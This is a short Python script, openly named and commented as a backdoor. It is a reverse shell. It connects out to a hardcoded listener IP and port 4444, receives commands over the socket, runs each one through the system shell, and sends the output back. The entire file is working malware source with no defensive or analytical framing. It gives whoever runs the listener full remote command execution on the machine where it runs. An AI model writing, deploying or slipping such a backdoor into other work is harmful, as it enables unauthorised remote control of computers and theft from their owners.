#!/usr/bin/env python

import socket, subprocess

class Backdoor:
	def __init__(self, ip, port): # Constructor
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket object
		self.connection.connect((ip, port)) # connects socket to a destination ([targetIP],[targetPORT])
	
	def execute_system_commands(self, command): # Method to execute a command and return it's result
		return subprocess.check_output(command, shell=True)

	def run(self):
		while True:
			command = self.connection.recv(1024) # receives a command
			command_result = self.execute_system_commands(command) # executes it
			self.connection.send(command_result) # returns the command output
		self.connection.close()

my_backdoor = Backdoor("192.168.0.10", 4444) # listener's IP and port
my_backdoor.run()
